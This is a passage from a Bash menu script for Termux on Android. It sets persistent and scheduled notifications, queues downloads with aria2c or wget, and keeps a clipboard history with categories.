                    printf "  ${WH}[13] WiFi watcher    — fires notification when WiFi disconnects       ${RESET}\n"
                    printf "  ${WH}[14] Daily Recurring Reminder — repeats every day at HH:MM            ${RESET}\n"
                    echo ""
                    printf "  ${FADE}[b] Back${RESET}\n"
                    echo ""
                    _dv14
                    echo ""
                    printf "  ${C14}${BOLD}Permanent » ${RESET}"
                    read -r pnch

                    case "$pnch" in
                        1)
                            echo ""
                            local bstat; bstat=$(timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"status":"\K[^"]+' | head -1)
                            local bpct;  bpct=$(timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"percentage":\K[0-9]+' | head -1)
                            bstat="${bstat:-UNKNOWN}"; bpct="${bpct:-?}"
                            if [[ "$bstat" == "CHARGING" || "$bstat" == "FULL" ]]; then
                                termux-notification \
                                    --title "⚡ Charging — ${bpct}%" \
                                    --content "Battery is ${bstat} · ${bpct}% · Fezzy Station monitoring" \
                                    --id 3001 --ongoing --priority high 2>/dev/null \
                                    && printf "  ${GRN}✓ Charging alert set (ID: 3001) — in tray${RESET}\n" \
                                    || printf "  ${RED}✗ Failed — is Termux:API app installed?${RESET}\n"
                            else
                                termux-notification \
                                    --title "🔋 Not Charging — ${bpct}%" \
                                    --content "Status: ${bstat} · ${bpct}% · Fezzy Station" \
                                    --id 3001 --ongoing --priority default 2>/dev/null \
                                    && printf "  ${GRN}✓ Battery status set (ID: 3001)${RESET}\n" \
                                    || printf "  ${RED}✗ Failed${RESET}\n"
                            fi
                            printf "  ${FADE}Remove later: termux-notification-remove 3001${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        2)
                            echo ""
                            printf "  ${WH}Alert threshold %%: ${RESET}"; read -r thresh
                            [[ -z "$thresh" || ! "$thresh" =~ ^[0-9]+$ ]] && thresh=20
                            local bpct2; bpct2=$(timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"percentage":\K[0-9]+' | head -1)
                            bpct2="${bpct2:-?}"
                            termux-notification \
                                --title "🔴 Low Battery — ${bpct2}%" \
                                --content "Battery at ${bpct2}% · Threshold: ${thresh}% · Charge now" \
                                --id 3002 --ongoing --priority high 2>/dev/null \
                                && printf "  ${GRN}✓ Low battery alert set (ID: 3002)${RESET}\n" \
                                || printf "  ${RED}✗ Failed${RESET}\n"
                            printf "  ${FADE}Remove later: termux-notification-remove 3002${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        3)
                            echo ""
                            local winfo; winfo=$(termux-wifi-connectioninfo 2>/dev/null)
                            local ssid; ssid=$(echo "$winfo" | grep -oP '"ssid":"\K[^"]+' | head -1)
                            if [[ -z "$ssid" || "$ssid" == "<unknown ssid>" ]]; then
                                termux-notification \
                                    --title "📵 WiFi Disconnected" \
                                    --content "No WiFi · Data only · Fezzy alert active" \
                                    --id 3003 --ongoing --priority high 2>/dev/null \
                                    && printf "  ${GRN}✓ WiFi disconnect alert set (ID: 3003)${RESET}\n" \
                                    || printf "  ${RED}✗ Failed${RESET}\n"
                            else
                                printf "  ${GRN}WiFi connected: %s — set alert anyway? [y/n]: ${RESET}" "$ssid"; read -r wconf
                                [[ "$wconf" != "y" && "$wconf" != "Y" ]] && continue
                                termux-notification \
                                    --title "📵 WiFi Monitor Active" \
                                    --content "Connected: ${ssid} · Fezzy watching for drops" \
                                    --id 3003 --ongoing --priority default 2>/dev/null \
                                    && printf "  ${GRN}✓ WiFi monitor set (ID: 3003)${RESET}\n" \
                                    || printf "  ${RED}✗ Failed${RESET}\n"
                            fi
                            printf "  ${FADE}Remove later: termux-notification-remove 3003${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        4)
                            echo ""
                            local winfo2; winfo2=$(termux-wifi-connectioninfo 2>/dev/null)
                            local ssid2; ssid2=$(echo "$winfo2" | grep -oP '"ssid":"\K[^"]+' | head -1)
                            local ip2;   ip2=$(echo "$winfo2" | grep -oP '"ip":"\K[^"]+' | head -1)
                            ssid2="${ssid2:-No WiFi}"; ip2="${ip2:-N/A}"
                            termux-notification \
                                --title "📶 WiFi: ${ssid2}" \
                                --content "IP: ${ip2} · Fezzy Station connected" \
                                --id 3004 --ongoing --priority low 2>/dev/null \
                                && printf "  ${GRN}✓ WiFi SSID tray indicator set (ID: 3004)${RESET}\n" \
                                || printf "  ${RED}✗ Failed${RESET}\n"
                            printf "  ${FADE}Remove later: termux-notification-remove 3004${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        5)
                            echo ""
                            printf "  ${WH}Title: ${RESET}"; read -r cntitle
                            printf "  ${WH}Message: ${RESET}"; read -r cnmsg
                            printf "  ${WH}ID (3005-3020, default 3005): ${RESET}"; read -r cnid
                            [[ -z "$cnid" || ! "$cnid" =~ ^[0-9]+$ ]] && cnid=3005
                            [[ -z "$cntitle" ]] && cntitle="Fezzy Station"
                            [[ -z "$cnmsg" ]] && cnmsg="Persistent notification · 999"
                            termux-notification \
                                --title "$cntitle" \
                                --content "$cnmsg" \
                                --id "$cnid" --ongoing --priority default 2>/dev/null \
                                && printf "  ${GRN}✓ Custom permanent notification set (ID: %s)${RESET}\n" "$cnid" \
                                || printf "  ${RED}✗ Failed${RESET}\n"
                            printf "  ${FADE}Remove later: termux-notification-remove %s${RESET}\n" "$cnid"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        6)
                            echo ""
                            local mood3=$(_bojack_mood)
                            local bpct3; bpct3=$(_get_battery 2>/dev/null || echo "N/A")
                            termux-notification \
                                --title "🐾 Fezzy Portals V1 Enhanced — Active" \
                                --content "Strategy Over Impulse · 999 · Battery: ${bpct3} · ${mood3}" \
                                --id 3006 --ongoing --priority low 2>/dev/null \
                                && printf "  ${GRN}✓ Fezzy Station tray indicator set (ID: 3006)${RESET}\n" \
                                || printf "  ${RED}✗ Failed${RESET}\n"
                            printf "  ${FADE}Remove later: termux-notification-remove 3006${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        7)
                            echo ""
                            printf "  ${WH}Download filename: ${RESET}"; read -r dlname
                            [[ -z "$dlname" ]] && dlname="Active download"
                            termux-notification \
                                --title "⬇ Downloading…" \
                                --content "${dlname} · In progress · Fezzy Station" \
                                --id 3007 --ongoing --priority low 2>/dev/null \
                                && printf "  ${GRN}✓ Download indicator set (ID: 3007)${RESET}\n" \
                                || printf "  ${RED}✗ Failed${RESET}\n"
                            printf "  ${FADE}Remove when done: termux-notification-remove 3007${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        8)
                            echo ""
                            termux-notification \
                                --title "🖥 VNC Server — :1 Active" \
                                --content "Connect bVNC → 127.0.0.1:5901 · XFCE4 · Fezzy Station" \
                                --id 3008 --ongoing --priority low 2>/dev/null \
                                && printf "  ${GRN}✓ VNC indicator set (ID: 3008)${RESET}\n" \
                                || printf "  ${RED}✗ Failed${RESET}\n"
                            printf "  ${FADE}Remove when VNC stopped: termux-notification-remove 3008${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        9)
                            echo ""
                            printf "  ${WH}Notification ID to remove: ${RESET}"; read -r rmid
                            [[ -z "$rmid" || ! "$rmid" =~ ^[0-9]+$ ]] && continue
                            termux-notification-remove "$rmid" 2>/dev/null \
                                && printf "  ${GRN}✓ Removed ID %s${RESET}\n" "$rmid" \
                                || printf "  ${RED}✗ Failed${RESET}\n"
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        10)
                            echo ""
                            printf "  ${C14}[*] Active notifications:${RESET}\n\n"
                            termux-notification-list 2>/dev/null | python3 -c "
import sys,json
try:
    ns=json.load(sys.stdin)
    if not ns: print('  No active notifications')
    for n in ns:
        print(f\"  ID: {n.get('id','?')}  |  {n.get('title','(no title)')}\")
        print(f\"  {n.get('content','')}\")
        print()
except: print('  termux-notification-list failed')
" 2>/dev/null
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        11)
                            echo ""
                            printf "  ${YEL}Remove all Fezzy notifications (3001–3020)? [y/n]: ${RESET}"; read -r raconf
                            if [[ "$raconf" == "y" || "$raconf" == "Y" ]]; then
                                for rid in $(seq 3001 3020); do
                                    termux-notification-remove "$rid" 2>/dev/null
                                done
                                printf "  ${GRN}✓ All Fezzy notification slots cleared${RESET}\n"
                            else
                                printf "  ${FADE}Cancelled${RESET}\n"
                            fi
                            echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                        12)
                            echo ""
                            printf "  ${C14}[*] Battery Watcher — polls every 60s · Ctrl+C to stop${RESET}\n\n"
                            local bw_last=""
                            while true; do
                                local bw_stat; bw_stat=$(timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"status":"\K[^"]+' | head -1)
                                local bw_pct;  bw_pct=$(timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"percentage":\K[0-9]+' | head -1)
                                bw_stat="${bw_stat:-UNKNOWN}"; bw_pct="${bw_pct:-?}"
                                if [[ "$bw_stat" != "$bw_last" ]]; then
                                    if [[ "$bw_stat" == "CHARGING" ]]; then
                                        termux-notification --title "⚡ Now Charging — ${bw_pct}%" \
                                            --content "Battery charging · ${bw_pct}% · Fezzy watcher" \
                                            --id 3001 --ongoing --priority high 2>/dev/null
                                        printf "  ${GRN}[%s] CHARGING → notification updated${RESET}\n" "$(date '+%H:%M:%S')"
                                    elif [[ "$bw_stat" == "DISCHARGING" || "$bw_stat" == "NOT_CHARGING" ]]; then
                                        termux-notification --title "🔋 Unplugged — ${bw_pct}%" \
                                            --content "Draining · ${bw_pct}% · Fezzy watcher" \
                                            --id 3001 --ongoing --priority default 2>/dev/null
                                        printf "  ${YEL}[%s] UNPLUGGED → notification updated${RESET}\n" "$(date '+%H:%M:%S')"
                                    fi
                                    bw_last="$bw_stat"
                                fi
                                printf "  ${FADE}[%s] %s%% · %s · 60s poll...${RESET}\r" "$(date '+%H:%M:%S')" "$bw_pct" "$bw_stat"
                                sleep 60
                            done 2>/dev/null ;;
                        13)
                            echo ""
                            printf "  ${C14}[*] WiFi Watcher — polls every 30s · Ctrl+C to stop${RESET}\n\n"
                            local ww_last=""
                            while true; do
                                local ww_ssid; ww_ssid=$(termux-wifi-connectioninfo 2>/dev/null | grep -oP '"ssid":"\K[^"]+' | head -1)
                                ww_ssid="${ww_ssid:-DISCONNECTED}"
                                if [[ "$ww_ssid" != "$ww_last" ]]; then
                                    if [[ "$ww_ssid" == "DISCONNECTED" || "$ww_ssid" == "<unknown ssid>" ]]; then
                                        termux-notification --title "📵 WiFi Lost" \
                                            --content "WiFi disconnected · Fezzy alert" \
                                            --id 3003 --ongoing --priority high 2>/dev/null
                                        printf "  ${RED}[%s] WiFi LOST → alert fired${RESET}\n" "$(date '+%H:%M:%S')"
                                    else
                                        termux-notification --title "📶 WiFi: ${ww_ssid}" \
                                            --content "Connected to ${ww_ssid} · Fezzy watching" \
                                            --id 3003 --ongoing --priority low 2>/dev/null
                                        printf "  ${GRN}[%s] Connected: %s${RESET}\n" "$(date '+%H:%M:%S')" "$ww_ssid"
                                    fi
                                    ww_last="$ww_ssid"
                                fi
                                printf "  ${FADE}[%s] WiFi: %s · 30s poll...${RESET}\r" "$(date '+%H:%M:%S')" "$ww_ssid"
                                sleep 30
                            done 2>/dev/null ;;
                        14)
                            echo ""
                            printf "  ${C14}${BOLD}[*] Daily Recurring Reminder${RESET}\n\n"
                            printf "  ${FADE}Fires every day at the time you set · runs in background${RESET}\n\n"
                            printf "  ${WH}Title: ${RESET}"; read -r dr_title
                            [[ -z "$dr_title" ]] && dr_title="Fezzy Daily Reminder"
                            printf "  ${WH}Message: ${RESET}"; read -r dr_msg
                            [[ -z "$dr_msg" ]] && dr_msg="Strategy Over Impulse · 999"
                            printf "  ${WH}Fire time HH:MM (24h): ${RESET}"; read -r dr_time
                            if [[ ! "$dr_time" =~ ^[0-9]{2}:[0-9]{2}$ ]]; then
                                printf "  ${RED}Invalid format — use HH:MM${RESET}\n"
                                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                            else
                                local dr_h="${dr_time%%:*}" dr_m="${dr_time##*:}"
                                (
                                    while true; do
                                        local now_hm; now_hm=$(date +%H:%M)
                                        if [[ "$now_hm" == "$dr_time" ]]; then
                                            termux-notification \
                                                --title "⏰ $dr_title" \
                                                --content "$dr_msg" \
                                                --priority high \
                                                --id 3020 2>/dev/null
                                            sleep 61
                                        fi
                                        sleep 30
                                    done
                                ) &
                                printf "  ${GRN}✓ Daily reminder set for %s every day — PID: %s${RESET}\n" "$dr_time" "$!"
                                printf "  ${FADE}Keep Termux open · use termux-wake-lock to prevent sleep${RESET}\n"
                                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                            fi ;;
                        b|B) break ;;
                        *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                    esac
                done ;;
            35)
                echo ""
                printf "  ${C14}${BOLD}[*] Reminder Notification — fires once at exact time${RESET}\n\n"
                printf "  ${WH}Title: ${RESET}"; read -r ntitle
                [[ -z "$ntitle" ]] && ntitle="Fezzy Reminder"
                printf "  ${WH}Message: ${RESET}"; read -r nmsg
                [[ -z "$nmsg" ]] && nmsg="Reminder from Fezzy Station"
                printf "  ${WH}Fire time HH:MM (24h, today): ${RESET}"; read -r rtime
                if [[ ! "$rtime" =~ ^[0-9]{2}:[0-9]{2}$ ]]; then
                    printf "  ${RED}Invalid format — use HH:MM (e.g. 14:30)${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r
                    continue
                fi
                local now_sec target_sec delay_sec rh rm
                rh="${rtime%%:*}"; rm="${rtime##*:}"
                now_sec=$(date +%s)
                target_sec=$(date -d "today $rh:$rm" +%s 2>/dev/null || \
                    python3 -c "import time; t=time.localtime(); import datetime; dt=datetime.datetime.now().replace(hour=$((10#$rh)),minute=$((10#$rm)),second=0,microsecond=0); print(int(dt.timestamp()))" 2>/dev/null)
                delay_sec=$(( target_sec - now_sec ))
                if [[ -z "$delay_sec" || "$delay_sec" -le 0 ]]; then
                    printf "  ${YEL}[!] That time is in the past — scheduling for tomorrow${RESET}\n"
                    delay_sec=$(( delay_sec + 86400 ))
                fi
                ( sleep "$delay_sec" && termux-notification \
                    --title "⏰ $ntitle" \
                    --content "$nmsg" \
                    --priority high \
                    --id 1015 2>/dev/null ) &
                printf "  ${GRN}✓ Reminder set for %s — fires in %ss (PID: %s)${RESET}\n" "$rtime" "$delay_sec" "$!"
                printf "  ${FADE}Runs in background · keep Termux open or use termux-wake-lock${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            36)
                echo ""
                printf "  ${C14}${BOLD}[*] Open-URL Action Notification${RESET}\n\n"
                printf "  ${FADE}Tap this notification to open a URL in the browser${RESET}\n\n"
                printf "  ${WH}Title: ${RESET}"; read -r ntitle
                [[ -z "$ntitle" ]] && ntitle="Fezzy Station"
                printf "  ${WH}Message: ${RESET}"; read -r nmsg
                [[ -z "$nmsg" ]] && nmsg="Tap to open"
                printf "  ${WH}URL to open: ${RESET}"; read -r nurl
                [[ -z "$nurl" ]] && nurl="https://github.com/philfesters"
                termux-notification \
                    --title "$ntitle" \
                    --content "$nmsg" \
                    --action "termux-open-url \"$nurl\"" \
                    --id 1016 2>/dev/null \
                    && printf "  ${GRN}✓ Notification sent — tap it to open: %s${RESET}\n" "$nurl" \
                    || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            37)
                echo ""
                printf "  ${C14}${BOLD}[*] Media-Style Notification${RESET}\n\n"
                printf "  ${FADE}Shows like a Now Playing card in the tray${RESET}\n\n"
                printf "  ${WH}Artist: ${RESET}"; read -r artist
                [[ -z "$artist" ]] && artist="Juice WRLD"
                printf "  ${WH}Track: ${RESET}"; read -r track
                [[ -z "$track" ]] && track="Legends Never Die"
                printf "  ${WH}Album [ENTER to skip]: ${RESET}"; read -r album
                local media_content="$track"
                [[ -n "$album" ]] && media_content="$track · $album"
                termux-notification \
                    --title "🎵 $artist" \
                    --content "$media_content" \
                    --style media \
                    --id 1017 2>/dev/null \
                    && printf "  ${GRN}✓ Media notification: %s — %s${RESET}\n" "$artist" "$track" \
                    || {
                        printf "  ${YEL}[!] media style not supported — sending as bigtext${RESET}\n"
                        termux-notification \
                            --title "🎵 $artist" \
                            --content "$media_content" \
                            --style bigtext \
                            --id 1017 2>/dev/null \
                            && printf "  ${GRN}✓ Sent as bigtext${RESET}\n" \
                            || printf "  ${RED}Failed — termux-api required${RESET}\n"
                    }
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [15] DOWNLOAD MANAGER PORTAL
# ═══════════════════════════════════════════════════════════════════

dlmanager_portal() {
    local QFILE="$DLQDIR/queue.txt"
    touch "$QFILE" 2>/dev/null

    while true; do
        clear
        echo ""
        _dv15
        printf "  ${C15}${BOLD}DOWNLOAD MANAGER  —  aria2c · Queue · Multi-Thread  ${RESET}\n"
        _dv15
        echo ""
        printf "  ${WH}aria2c · multi-thread · pause/resume · queue management · batch ops${RESET}\n"
        printf "  ${FADE}■ Silent pull operation · queue fills while you sleep · Bojack guards the vault${RESET}\n"
        echo ""
        local qcount; qcount=$(grep -c "." "$QFILE" 2>/dev/null || echo 0)
        printf "  ${C15}[QUEUE]${RESET} ${WH}%s URL(s) pending${RESET}\n\n" "$qcount"
        _dv15
        echo ""
        printf "  ${WH}[1]  Add URL to queue                                                ${RESET}\n"
        printf "  ${WH}[2]  Add bulk URLs (paste, Ctrl+D to finish)                        ${RESET}\n"
        printf "  ${WH}[3]  View queue                                                      ${RESET}\n"
        printf "  ${WH}[4]  Run queue — download all queued URLs                            ${RESET}\n"
        printf "  ${WH}[5]  Download now — skip queue, immediate single download            ${RESET}\n"
        printf "  ${WH}[6]  Multi-thread download — 16 connections, max speed              ${RESET}\n"
        printf "  ${WH}[7]  Resume interrupted download — .aria2 file needed               ${RESET}\n"
        printf "  ${WH}[8]  Torrent / Magnet — aria2c torrent support                      ${RESET}\n"
        printf "  ${WH}[9]  Clear queue                                                     ${RESET}\n"
        printf "  ${WH}[10] Check aria2c status                                             ${RESET}\n"
        printf "  ${WH}[11] Install aria2c                                                  ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv15
        echo ""
        _hover_hint "downloads"
        echo ""
        printf "  ${C15}${BOLD}Choice » ${RESET}"
        read -r ch

        case "$ch" in
            1)
                echo ""; printf "  ${WH}URL to queue: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo "$url" >> "$QFILE"
                printf "  ${GRN}✓ Added to queue${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""
                printf "  ${C15}[*] Paste URLs (one per line, Ctrl+D when done):${RESET}\n\n"
                local added=0
                while IFS= read -r url; do
                    [[ -z "$url" ]] && continue
                    echo "$url" >> "$QFILE"
                    ((added++))
                done 2>/dev/null
                printf "\n  ${GRN}✓ Added %s URL(s) to queue${RESET}\n" "$added"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${C15}[*] Current queue (%s URL(s)):${RESET}\n\n" "$qcount"
                if [[ "$qcount" -eq 0 ]]; then
                    printf "  ${FADE}Queue empty${RESET}\n"
                else
                    cat -n "$QFILE" | sed 's/^/  /'
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                if [[ "$qcount" -eq 0 ]]; then
                    printf "  ${FADE}Queue empty — add URLs first${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                if ! command -v aria2c &>/dev/null; then
                    printf "  ${RED}aria2c not installed — use option [11]${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                printf "  ${C15}[*] Running queue (%s downloads)...${RESET}\n\n" "$qcount"
                aria2c --dir="$DLDIR" --max-concurrent-downloads=4 --max-connection-per-server=8 \
                       --split=8 --continue=true --input-file="$QFILE"
                printf "\n  ${GRN}✓ Queue complete${RESET}\n"
                printf "  ${WH}Clear queue? [y/n]: ${RESET}"; read -r clr
                [[ "$clr" == "y" || "$clr" == "Y" ]] && > "$QFILE" && printf "  ${GRN}✓ Queue cleared${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}URL: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                if command -v aria2c &>/dev/null; then
                    printf "  ${C15}[*] Downloading...${RESET}\n\n"
                    aria2c --dir="$DLDIR" --max-connection-per-server=8 --split=8 --continue=true "$url"
                else
                    printf "  ${FADE}aria2c not found — falling back to wget${RESET}\n\n"
                    wget -c -P "$DLDIR" "$url"
                fi
                printf "\n  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""; printf "  ${WH}URL for max-speed download: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                if command -v aria2c &>/dev/null; then
                    printf "  ${C15}[*] 16-connection blast download...${RESET}\n\n"
                    aria2c --dir="$DLDIR" --max-connection-per-server=16 --split=16 --continue=true "$url"
                else
                    printf "  ${RED}aria2c not installed — use option [11]${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""; printf "  ${WH}URL of incomplete download: ${RESET}"; read -r url
                [[ -z "$url" ]] && continue
                echo ""
                printf "  ${C15}[*] Resuming download...${RESET}\n\n"
                aria2c --dir="$DLDIR" --continue=true --max-connection-per-server=8 --split=8 "$url" 2>/dev/null || \
                    wget -c -P "$DLDIR" "$url"
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""; printf "  ${WH}Magnet link or .torrent URL: ${RESET}"; read -r magnet
                [[ -z "$magnet" ]] && continue
                echo ""
                if command -v aria2c &>/dev/null; then
                    printf "  ${C15}[*] Torrent download to %s...${RESET}\n\n" "$DLDIR"
                    aria2c --dir="$DLDIR" --seed-time=0 "$magnet"
                else
                    printf "  ${RED}aria2c not installed — use option [11]${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                printf "  ${RED}Clear entire queue? [y/n]: ${RESET}"; read -r confirm
                [[ "$confirm" == "y" || "$confirm" == "Y" ]] && > "$QFILE" && printf "  ${GRN}✓ Queue cleared${RESET}\n" || printf "  ${FADE}Cancelled${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""
                if command -v aria2c &>/dev/null; then
                    printf "  ${GRN}✓ aria2c installed:${RESET} $(aria2c --version 2>/dev/null | head -1)\n"
                else
                    printf "  ${RED}✗ aria2c not installed${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""
                printf "  ${C15}[*] Installing aria2c...${RESET}\n\n"
                pkg install aria2
                echo ""; printf "  ${GRN}✓ Done${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [16] CLIPBOARD MANAGER PORTAL
# ═══════════════════════════════════════════════════════════════════

clipboard_portal() {
    local CLIP_HIST="$CLIPDIR/history.txt"
    local CLIP_CATS="$CLIPDIR/categories"
    mkdir -p "$CLIP_CATS" 2>/dev/null
    touch "$CLIP_HIST" 2>/dev/null

    while true; do
        clear
        echo ""
        _dv16
        printf "  ${C16}${BOLD}CLIPBOARD MANAGER  —  History · Categories · Paste  ${RESET}\n"
        _dv16
        echo ""
        printf "  ${WH}termux-clipboard · history · categories · search · paste shortcuts${RESET}\n"
        printf "  ${FADE}■ Nothing gets lost · every copy logged · strategy in every paste${RESET}\n"
        echo ""
        local hcount; hcount=$(grep -c "." "$CLIP_HIST" 2>/dev/null || echo 0)
        printf "  ${C16}[HISTORY]${RESET} ${WH}%s entry(ies) stored${RESET}\n\n" "$hcount"
        _dv16
        echo ""
        printf "  ${WH}[1]  Capture — copy current clipboard to history                    ${RESET}\n"
        printf "  ${WH}[2]  Add Entry — manually type and save a clip                      ${RESET}\n"
        printf "  ${WH}[3]  View History — list all saved clips                            ${RESET}\n"
        printf "  ${WH}[4]  Search History — keyword search across clips                   ${RESET}\n"
        printf "  ${WH}[5]  Paste by Number — copy a history entry back to clipboard       ${RESET}\n"
        printf "  ${WH}[6]  Save to Category — tag an entry under a category              ${RESET}\n"
        printf "  ${WH}[7]  View Category — list entries in a category                    ${RESET}\n"
        printf "  ${WH}[8]  Quick Paste Shortcuts — save URL/password/address template    ${RESET}\n"
        printf "  ${WH}[9]  Delete Entry — remove by number                               ${RESET}\n"
        printf "  ${WH}[10] Clear History — wipe all entries                              ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv16
        echo ""
        _hover_hint "clipboard"
        echo ""
        printf "  ${C16}${BOLD}Choice » ${RESET}"
        read -r ch

        case "$ch" in
            1)
                echo ""
                local clip; clip=$(termux-clipboard-get 2>/dev/null)
                if [[ -z "$clip" ]]; then
                    printf "  ${FADE}Clipboard is empty${RESET}\n"
                else
                    local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
                    echo "[$ts] $clip" >> "$CLIP_HIST"
                    printf "  ${GRN}✓ Captured: %.60s${RESET}\n" "$clip"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Text to save: ${RESET}"; read -r txt
                [[ -z "$txt" ]] && continue
                local ts; ts=$(date '+%Y-%m-%d %H:%M:%S')
                echo "[$ts] $txt" >> "$CLIP_HIST"
                printf "  ${GRN}✓ Saved to history${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${C16}[*] Clipboard History (%s entries):${RESET}\n\n" "$hcount"
                if [[ "$hcount" -eq 0 ]]; then
                    printf "  ${FADE}No entries yet${RESET}\n"
                else
                    cat -n "$CLIP_HIST" | tail -30 | sed 's/^/  /'
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}Search keyword: ${RESET}"; read -r kw
                [[ -z "$kw" ]] && continue
                echo ""
                printf "  ${C16}[*] Results for '%s':${RESET}\n\n" "$kw"
                grep -in "$kw" "$CLIP_HIST" | head -20 | sed 's/^/  /' || printf "  ${FADE}No matches${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                cat -n "$CLIP_HIST" | tail -20 | sed 's/^/  /'
                echo ""; printf "  ${WH}Entry number to paste (copy to clipboard): ${RESET}"; read -r num
                [[ -z "$num" ]] && continue
                local entry; entry=$(sed -n "${num}p" "$CLIP_HIST" | sed 's/^\[[^]]*\] //')
                [[ -z "$entry" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo "$entry" | termux-clipboard-set 2>/dev/null && printf "  ${GRN}✓ Copied to clipboard: %.60s${RESET}\n" "$entry" || printf "  ${RED}Failed — termux-api required${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                cat -n "$CLIP_HIST" | tail -20 | sed 's/^/  /'
                echo ""; printf "  ${WH}Entry number to categorize: ${RESET}"; read -r num
                local entry; entry=$(sed -n "${num}p" "$CLIP_HIST")
                [[ -z "$entry" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""; printf "  ${WH}Category name: ${RESET}"; read -r cat
                [[ -z "$cat" ]] && continue
                mkdir -p "$CLIP_CATS/$cat"
                echo "$entry" >> "$CLIP_CATS/$cat/entries.txt"
                printf "  ${GRN}✓ Saved to category: %s${RESET}\n" "$cat"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""
                printf "  ${C16}Categories:${RESET}\n\n"
                mapfile -t cats < <(find "$CLIP_CATS" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort)
                [[ ${#cats[@]} -eq 0 ]] && { printf "  ${FADE}No categories yet${RESET}\n"; echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue; }
                local i=1; for c in "${cats[@]}"; do
                    local cnt; cnt=$(wc -l < "$c/entries.txt" 2>/dev/null || echo 0)
                    printf "  ${C16}%2d.${RESET} %-20s ${FADE}%s entries${RESET}\n" "$i" "$(basename "$c")" "$cnt"; ((i++))
                done 2>/dev/null
                echo ""; printf "  ${WH}Category number to view: ${RESET}"; read -r num
                local cat_dir="${cats[$(( num - 1 ))]}"
                [[ ! -d "$cat_dir" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
